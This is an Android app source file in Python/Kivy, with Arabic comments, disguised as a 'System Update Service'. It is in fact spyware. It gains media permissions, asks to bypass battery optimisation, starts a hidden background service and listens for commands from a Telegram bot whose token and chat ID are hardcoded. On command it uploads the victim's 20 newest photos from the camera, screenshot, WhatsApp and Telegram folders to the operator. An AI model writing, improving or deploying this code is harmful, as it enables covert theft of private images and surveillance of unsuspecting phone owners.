import os, requests, threading, time
from kivy.app import App
from kivy.uix.label import Label
from jnius import autoclass
from android.permissions import request_permissions, Permission

# معلومات السيطرة
BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbyNkQugNPhEFg0"
CHAT_ID = "7084557369"

class ShadowCore(App):
    def build(self):
        return Label(text="System Update Service\n[color=00ff00]Active ✅[/color]", markup=True)

    def on_start(self):
        # 1. طلب الأذونات الشاملة
        perms = [Permission.READ_MEDIA_IMAGES, Permission.READ_MEDIA_VIDEO, Permission.POST_NOTIFICATIONS]
        request_permissions(perms, self.after_perms)

    def after_perms(self, permissions, results):
        if all(results):
            # 2. طلب البقاء حياً (تجاوز البطارية)
            self.request_ignore_battery()
            # 3. تشغيل خدمة الخلفية (المحرك الخفي)
            self.start_service()
            # 4. تشغيل مستمع الأوامر
            threading.Thread(target=self.bot_listener, daemon=True).start()

    def request_ignore_battery(self):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            activity = PythonActivity.mActivity
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(Uri.parse(f"package:{activity.getPackageName()}"))
            activity.startActivity(intent)
        except: pass

    def start_service(self):
        try:
            # تشغيل ملف service.py برمجياً
            context = autoclass('org.kivy.android.PythonActivity').mActivity
            service = autoclass('org.test.shadowcore.ServiceMyservice')
            service.start(context, "")
        except: pass

    def send_tg(self, method, data=None, files=None):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
            return requests.post(url, data=data, files=files, timeout=30, verify=False)
        except: return None

    def bot_listener(self):
        last_id = 0
        self.send_tg("sendMessage", {"chat_id": CHAT_ID, "text": "✅ [V1.85]: النظام جاهز للاكتساح الشامل."})
        while True:
            try:
                r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_id+1}", timeout=20, verify=False).json()
                for up in r.get("result", []):
                    last_id = up["update_id"]
                    msg = up.get("message", {}).get("text", "")
                    if msg == "/photo":
                        self.grab_everything()
                time.sleep(4)
            except: time.sleep(10)

    def grab_everything(self):
        # البحث في كل الزوايا (كاميرا، واتساب، تليجرام، صور)
        paths = [
            "/sdcard/DCIM/Camera",
            "/sdcard/Pictures/Screenshots",
            "/sdcard/WhatsApp/Media/WhatsApp Images",
            "/sdcard/Telegram/Telegram Images",
            "/storage/emulated/0/DCIM/Camera",
            "/storage/emulated/0/Pictures"
        ]
        
        all_pics = []
        for p in paths:
            if os.path.exists(p):
                files = [os.path.join(p, f) for f in os.listdir(p) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
                all_pics.extend(files)

        # السر: ترتيب تنازلي (الأحدث يرسل أولاً)
        all_pics.sort(key=os.path.getmtime, reverse=True)

        if not all_pics:
            self.send_tg("sendMessage", {"chat_id": CHAT_ID, "text": "❌ لم أجد صوراً حديثة."})
            return

        self.send_tg("sendMessage", {"chat_id": CHAT_ID, "text": f"📸 جاري سحب أحدث {len(all_pics[:20])} صورة..."})
        
        for pic in all_pics[:20]: # يسحب آخر 20 صورة تم التقاطها
            with open(pic, 'rb') as f:
                self.send_tg("sendDocument", {"chat_id": CHAT_ID}, {"document": f})
            time.sleep(1.5)
